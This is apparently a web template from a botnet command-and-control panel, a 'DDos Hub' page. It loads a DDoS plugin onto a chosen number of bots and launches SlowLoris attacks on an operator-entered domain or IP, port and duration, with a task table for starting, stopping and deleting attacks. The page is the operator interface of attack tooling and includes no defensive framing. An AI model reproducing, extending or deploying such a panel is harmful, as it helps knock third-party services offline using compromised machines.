{include file="header.tpl"}
{include file="nav.tpl"}


<script>

    //  $('.bot_table').DataTable();

    function openDDosInfo(){

        $.get( "/ddosinfo", function( data ) {
            $("#ddosInfos").modal( { show: true } );
            $( "#ddosInformations" ).html( data );

        });
    }
</script>
<!-- The Modal -->
<div class="modal" id="ddosInfos">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">

            <!-- Modal Header -->
            <div class="modal-header">
                <h4 class="modal-title">Bot Info</h4>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <!-- Modal body -->
            <div id="ddosInformations" class="modal-body">

            </div>

            <!-- Modal footer -->
            <div class="modal-footer">
                <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
            </div>

        </div>
    </div>
</div>




<div class="page-header">
    <div class="container-fluid">
        <h2 class="h5 no-margin-bottom"> DDos Hub</h2>
    </div>
</div>
<div class="container">
    <div class="row">

        <div class="col-md-6">
            {if $bots_count == 0}
                <p>You have no Active DDos Bots running please load the DDos plugin on a Amount of bots to begin a
                    Task</p>
                <form method="POST">
                    <div class="form-group">
                        <label for="usr">Load Bots for DDOS:</label>
                        <input type="number" name="load-ddosBots" value="10" class="form-control">
                    </div>
                    <input type="submit" value="Start" class="btn btn-danger">
                </form>
            {else}
                <h4> Currently are <a href="javascript:void(0)" onclick="openDDosInfo()">{$bots_count}</a> Bots Loaded for DDos </h4>
                todo add function on more bots (function)
                <form method="post">
                    <div class="form-group">
                        <label for="sel1">Select Method:</label>
                        <select name="method" class="form-control" id="sel1">
                             <option value="slow">SlowLoris</option>
                        <!--     <option value="udp">UDP</option>
                             <option value="tcp">TCP</option> -->
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="usr">Domain/Ip:</label>
                        <input type="text" name="targetip" class="form-control" required>
                    </div>

                    <div class="form-group">
                        <label for="usr">Port:</label>
                        <input type="text" name="targetport" class="form-control">
                    </div>

                    <div class="form-group">
                        <label for="usr">Max-Time:</label>
                        <input type="text" name="maxtime" class="form-control" required>
                    </div>

                    <input type="submit" value="Start" class="btn btn-danger">
                </form>
            {/if}

            <hr>

        </div>
        <div class="col-md-6">
            <table class="table">

            <tr>
                <th>ID</th>
                <th>Target</th>
                <th>Working on</th>
                <th>Status</th>
            </tr>
            {foreach from=$tasks item=task}
                <tr>
                    <td>{$task.id}</td>
                    <td>{$task.targetip}</td>
                    <td>{if $task.status} {$task.workingon}  {/if}</td>
                    <td>
                        <form method="post"  >
                            <input name="changeTask" value="{$task.id}" hidden>
                            {if $task.status}
                                {if $task.status == "none"}
                                    <input type="submit" value="Start">
                                {else}
                                    <input type="submit" value="Stop">
                                {/if}
                            {/if}
                        </form>
                        <form method="post" onSubmit="if(!confirm('Sure?')){ return false; }">
                            <input name="delete" value="{$task.id}" hidden>
                            <input type="submit" value="Delete">
                        </form>
                    </td>
                </tr>
            {/foreach}
            </table>
        </div>
    </div>

</div>


{include file="footer.tpl"}